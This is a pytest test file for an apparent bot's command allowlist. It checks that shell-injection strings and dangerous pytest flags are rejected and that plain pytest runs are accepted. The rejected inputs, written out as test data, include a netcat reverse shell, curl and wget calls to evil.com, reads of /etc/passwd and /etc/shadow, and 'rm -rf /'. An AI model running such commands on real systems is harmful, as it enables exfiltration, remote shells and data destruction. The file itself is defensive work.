"""Security tests for CommandPolicy: command allowlist and shell injection prevention."""

import pytest

from issuebot.security.command_policy import CommandPolicy, CommandPolicyError


@pytest.mark.parametrize(
    "cmd",
    [
        "pytest; rm -rf /",
        "pytest && curl http://evil.com/exfil",
        "pytest || nc -e /bin/sh 1.2.3.4 4444",
        "pytest | cat /etc/passwd",
        "pytest `whoami`",
        "pytest $(cat /etc/shadow)",
        "pytest > /tmp/out",
        "pytest < /dev/zero",
        "pytest\nrm -rf /",
        "pytest\rcurl evil.com",
    ],
)
def test_shell_metacharacters_rejected(cmd):
    with pytest.raises(CommandPolicyError, match="prohibited|metacharacter"):
        CommandPolicy.validate_and_parse(cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "curl -X POST https://evil.com/data",
        "wget https://evil.com/malware.sh",
        "pip install requests",
        "rm -rf /workspace",
        "sudo rm -rf /",
        "bash -c 'echo hacked'",
        "sh -c 'id'",
        "python -c 'import os; os.system(\"rm -rf /\")'",
    ],
)
def test_non_pytest_and_malicious_commands_rejected(cmd):
    with pytest.raises(CommandPolicyError, match="Forbidden|Only `pytest|prohibited|metacharacter"):
        CommandPolicy.validate_and_parse(cmd)


@pytest.mark.parametrize(
    "flag",
    [
        "-p evil_plugin",
        "-c /tmp/evil_conf.ini",
        "-o cache_dir=/tmp",
        "--rootdir=/etc",
        "--confcutdir=/etc",
        "--basetemp=/tmp",
        "--import-mode=importlib",
        "--override-ini=addopts=--help",
    ],
)
def test_prohibited_pytest_flags_rejected(flag):
    with pytest.raises(CommandPolicyError, match="prohibited for security"):
        CommandPolicy.validate_and_parse(f"pytest {flag}")


def test_path_traversal_in_test_command_rejected():
    with pytest.raises(CommandPolicyError, match="prohibited"):
        CommandPolicy.validate_and_parse("pytest ../tests/test_x.py")

    with pytest.raises(CommandPolicyError, match="prohibited"):
        CommandPolicy.validate_and_parse("pytest /etc/passwd")


def test_valid_pytest_commands_accepted():
    tokens = CommandPolicy.validate_and_parse("pytest -x -q")
    assert tokens[:3] == ["pytest", "-x", "-q"]
    assert "-p" in tokens and "no:cacheprovider" in tokens

    tokens2 = CommandPolicy.validate_and_parse(
        "python -m pytest tests/test_cart.py -k test_discount"
    )
    assert tokens2[0] == "pytest"
    assert "tests/test_cart.py" in tokens2
    assert "-k" in tokens2
